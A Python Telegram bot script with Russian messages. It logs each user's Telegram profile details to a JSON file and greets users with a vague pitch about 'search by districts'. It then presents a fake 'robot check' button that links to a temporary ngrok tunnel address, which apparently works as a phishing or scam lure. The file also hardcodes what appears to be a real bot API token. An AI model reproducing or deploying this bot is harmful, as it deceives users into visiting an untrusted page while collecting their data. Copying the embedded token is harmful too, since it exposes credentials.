import telebot
import json
import os
from telebot import types

API_TOKEN = '8121551283:AAEUChSEFU5NurFidyP6R8JC2ptf8Uh4kOU'
bot = telebot.TeleBot(API_TOKEN)
users_data_file = 'kogda_bd.json'

# Функция для чтения данных из файла
def read_users_data():
    if os.path.exists(users_data_file):
        with open(users_data_file, 'r', encoding='utf-8') as file:
            try:
                return json.load(file)
            except json.JSONDecodeError:
                return {}
    return {}

# Функция для записи данных в файл
def write_users_data(data):
    with open(users_data_file, 'w', encoding='utf-8') as file:
        json.dump(data, file, indent=4, ensure_ascii=False)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name
    language_code = message.from_user.language_code

    users_data = read_users_data()

    if user_id not in users_data:
        score = len(users_data) + 1
        users_data[user_id] = {
            'id': user_id,
            'username': username,
            'first_name': first_name,
            'last_name': last_name,
            'language_code': language_code,
            'score': score
        }
        write_users_data(users_data)

    bot.send_message(message.chat.id,
                     f"<b>👋Привет, {first_name}!</b>\n"
                     f"🍭Ты зашел сюда не просто так!\n\n"
                     f"<b>🌃Все знают что у нас есть преимущество - поиск по районам.</b>\n\n"
                     f"<i>Извините за нестабильную работу сайта и бота. "
                     f"Сейчас имеем проблему поиска новых серверов. "
                     f"Поэтому просьба не обращать внимания на странности и баги, мы и так знаем про них и работаем над решением</i>",
                     parse_mode='HTML')
    bot.send_message(message.chat.id, "Нажмите на кнопку ниже, чтобы пройти проверку.")
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    button = types.KeyboardButton("Проверка на робота")
    markup.add(button)
    bot.send_message(message.chat.id, "Выберите опцию:", reply_markup=markup)

# Обработчик нажатия на кнопку "Проверка на робота"
@bot.message_handler(func=lambda message: message.text == "Проверка на робота")
def check_robot(message):
    bot.send_message(message.chat.id, "<a href='https://b64a-87-245-175-2.ngrok-free.app'>Пожалуйста, перейдите по этой ссылке для проверки</a>", parse_mode='HTML')

if __name__ == "__main__":
    bot.polling()
